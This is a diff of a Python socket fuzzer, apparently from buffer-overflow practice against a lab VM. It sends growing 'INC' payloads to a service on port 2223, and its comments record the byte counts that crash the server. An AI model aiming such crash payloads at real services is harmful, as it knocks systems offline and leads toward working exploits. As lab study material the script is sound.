@@ -1,7 +1,7 @@
 import socket,time
 
-ip = '192.168.56.1'
-#ip ='10.0.2.15' #vm ip
+#ip = '192.168.56.1'
+ip ='10.0.2.15' #vm ip
 #port = 8421
 port = 2223
 def attack(payload):
@@ -31,8 +31,10 @@ def attack(payload):
 #         print(response)
 
 def fuzzer():
-    bytesNum = 1
-    garbage = b'INC ' +b'A'*bytesNum+b'BBBB'+b'C'+b'\n'#repeatedly sents bytes by increments of 10
+    #bytesNum = 9 #before crash
+    #bytesNum = 10 #to crash server
+    bytesNum = 1#x32dbg crashes at 6bytes
+    garbage = b'INC ' +b'1111'*bytesNum+b'ZIFE'+b'3'+b'\n'#repeatedly sents bytes by increments of 10
     try:
         attack(garbage)
         print(str(bytesNum+5)+" bytes sent")
